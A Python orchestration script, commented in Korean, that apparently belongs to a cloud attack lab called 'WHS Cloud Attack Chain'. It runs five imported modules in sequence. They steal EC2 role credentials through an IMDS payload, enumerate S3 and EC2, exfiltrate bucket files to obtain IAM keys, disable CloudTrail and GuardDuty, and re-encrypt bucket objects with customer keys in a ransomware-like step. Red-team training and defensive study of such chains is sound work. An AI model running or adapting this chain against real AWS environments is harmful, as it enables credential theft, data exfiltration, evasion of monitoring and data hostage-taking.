"""
전체 공격 체인 엔트리포인트.
1~5단계를 순서대로 실행하고, 각 단계 결과를 다음 단계로 전달한다.

실행:
    python attack/run_all.py
    python attack/run_all.py --alb-url https://xxxx.elb.amazonaws.com --bucket cloud9-attack-target-xxxx
    python attack/run_all.py --start-step 3  # 특정 단계부터 재개 (이전 단계 값은 인자로 주입)

단계별 단독 실행은 각 step*.py 참고.
"""

import argparse
import json
import logging
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import config


def _load_dotenv() -> None:
    """attack/.env 파일을 읽어 os.environ에 없는 키만 채운다."""
    env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env")
    if not os.path.exists(env_path):
        return
    with open(env_path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, _, val = line.partition("=")
            key = key.strip()
            if key not in os.environ:
                os.environ[key] = val.strip()


_load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "attack_chain.log"),
            encoding="utf-8",
        ),
    ],
)
log = logging.getLogger(__name__)


def _banner(step: int, title: str):
    log.info("")
    log.info("=" * 60)
    log.info("  STEP %d — %s", step, title)
    log.info("=" * 60)


def _fail(step: int, msg: str):
    log.error("[STEP %d 실패] %s", step, msg)
    log.error("공격 체인 중단.")
    sys.exit(1)


def main():
    parser = argparse.ArgumentParser(description="WHS Cloud Attack Chain — 전체 실행")
    parser.add_argument("--webapp-url",     default=None, help="웹앱 URL (기본: config.WEBAPP_URL)")
    parser.add_argument("--payload-mode",   default=None, choices=["default", "random"],
                        help="IMDS 페이로드 모드 (기본: config.IMDS_PAYLOAD_MODE)")
    parser.add_argument("--bucket",         default=None, help="타겟 버킷명 (기본: config.TARGET_BUCKET)")
    parser.add_argument("--start-step",     type=int, default=1, choices=range(1, 6),
                        help="재개할 단계 번호 (기본: 1). 이전 단계 값은 아래 --inject-* 인자로 주입.")

    # 단계 재개용 주입 인자
    parser.add_argument("--inject-access-key",     default=None, help="임시 AccessKeyId (step2~3 재개 시)")
    parser.add_argument("--inject-secret-key",     default=None, help="임시 SecretAccessKey")
    parser.add_argument("--inject-token",          default=None, help="임시 SessionToken")
    parser.add_argument("--inject-role-name",      default="cloud9-infra-attack-ec2-role")
    parser.add_argument("--inject-iam-access-key", default=None, help="IAM User AccessKeyId (step4~5 재개 시)")
    parser.add_argument("--inject-iam-secret-key", default=None, help="IAM User SecretAccessKey")
    parser.add_argument("--inject-iam-user",       default=config.IAM_USER_NAME)
    args = parser.parse_args()

    if args.payload_mode:
        config.IMDS_PAYLOAD_MODE = args.payload_mode

    webapp_url = args.webapp_url or config.WEBAPP_URL
    bucket     = args.bucket    or config.TARGET_BUCKET

    # 단계별 전달 데이터 컨테이너
    step1_result: dict = {}   # role_name, AccessKeyId, SecretAccessKey, Token
    step3_result: dict = {}   # iam_user_creds

    log.info("=" * 60)
    log.info("  WHS Cloud Attack Chain — 전체 실행 시작")
    log.info("  Webapp: %s", webapp_url)
    log.info("  Bucket: %s", bucket)
    log.info("=" * 60)

    # ── 이전 단계 값 주입 (--start-step 사용 시) ──────────────────
    if args.start_step > 1:
        if not (args.inject_access_key and args.inject_secret_key and args.inject_token):
            log.error("--start-step 2 이상이면 --inject-access-key / --inject-secret-key / --inject-token 필요")
            sys.exit(1)
        step1_result = {
            "role_name":       args.inject_role_name,
            "AccessKeyId":     args.inject_access_key,
            "SecretAccessKey": args.inject_secret_key,
            "Token":           args.inject_token,
        }

    if args.start_step > 3:
        iam_key    = args.inject_iam_access_key or os.environ.get("IAM_ACCESS_KEY_ID")
        iam_secret = args.inject_iam_secret_key or os.environ.get("IAM_SECRET_ACCESS_KEY")
        if not (iam_key and iam_secret):
            log.error("--start-step 4 이상이면 --inject-iam-access-key/--inject-iam-secret-key 또는 .env 필요")
            sys.exit(1)
        step3_result = {
            "iam_user_creds": {
                "AccessKeyId":     iam_key,
                "SecretAccessKey": iam_secret,
                "IAMUser":         os.environ.get("IAM_USER_NAME", args.inject_iam_user),
            }
        }

    # ── Step 1 ────────────────────────────────────────────────────
    if args.start_step <= 1:
        _banner(1, "Initial Access & Credential Access")
        import step1_initial_access
        try:
            step1_result = step1_initial_access.run(webapp_url=webapp_url)
        except Exception as e:
            _fail(1, str(e))
        log.info("[Step 1] role=%s  key=%s  exp=%s",
                 step1_result.get("role_name"),
                 step1_result.get("AccessKeyId"),
                 step1_result.get("Expiration"))

    # ── Step 2 ────────────────────────────────────────────────────
    if args.start_step <= 2:
        _banner(2, "Discovery (정찰)")
        import step2_discovery
        try:
            step2_result = step2_discovery.run(
                access_key=step1_result["AccessKeyId"],
                secret_key=step1_result["SecretAccessKey"],
                token=step1_result["Token"],
                role_name=step1_result.get("role_name", "cloud9-infra-attack-ec2-role"),
            )
        except Exception as e:
            _fail(2, str(e))
        log.info("[Step 2] 버킷 수=%d  EC2 인스턴스 수=%d",
                 len(step2_result["s3"]["buckets"]),
                 len(step2_result["ec2"]["instances"]))

    # ── Step 3 ────────────────────────────────────────────────────
    if args.start_step <= 3:
        _banner(3, "Exfiltration (데이터 유출)")
        import step3_exfiltration
        try:
            step3_result = step3_exfiltration.run(
                access_key=step1_result["AccessKeyId"],
                secret_key=step1_result["SecretAccessKey"],
                token=step1_result["Token"],
                bucket=bucket,
            )
        except Exception as e:
            _fail(3, str(e))
        log.info("[Step 3] 유출 파일: %s", step3_result["downloaded"])

    # .env / 환경변수에 실제 IAM 자격증명이 있으면 config.json 더미값 대체
    env_key    = os.environ.get("IAM_ACCESS_KEY_ID")
    env_secret = os.environ.get("IAM_SECRET_ACCESS_KEY")
    env_user   = os.environ.get("IAM_USER_NAME")
    if env_key and env_secret:
        log.info("[ENV] IAM 자격증명을 환경변수/.env 에서 로드 (config.json 더미값 대체)")
        step3_result["iam_user_creds"]["AccessKeyId"]     = env_key
        step3_result["iam_user_creds"]["SecretAccessKey"] = env_secret
        if env_user:
            step3_result["iam_user_creds"]["IAMUser"] = env_user

    iam_creds = step3_result["iam_user_creds"]

    # ── Step 4 ────────────────────────────────────────────────────
    if args.start_step <= 4:
        _banner(4, "Defense Evasion (CloudTrail + GuardDuty 비활성화)")
        import step4_defense_evasion
        try:
            step4_result = step4_defense_evasion.run(
                iam_access_key=iam_creds["AccessKeyId"],
                iam_secret_key=iam_creds["SecretAccessKey"],
            )
        except Exception as e:
            _fail(4, str(e))
        log.info("[Step 4] GuardDuty 비활성화: %s",
                 step4_result["guardduty"]["detectors_disabled"])

    # ── Step 5 ────────────────────────────────────────────────────
    if args.start_step <= 5:
        _banner(5, "Impact (SSE-C 재암호화)")
        import step5_impact
        try:
            step5_result = step5_impact.run(
                iam_access_key=iam_creds["AccessKeyId"],
                iam_secret_key=iam_creds["SecretAccessKey"],
                bucket=bucket,
            )
        except Exception as e:
            _fail(5, str(e))
        log.info("[Step 5] 재암호화 객체: %s", step5_result["encrypted_objects"])
        log.info("  키 파일: %s", step5_result["key_file"])

    log.info("")
    log.info("=" * 60)
    log.info("  전체 공격 체인 완료")
    log.info("=" * 60)


if __name__ == "__main__":
    main()
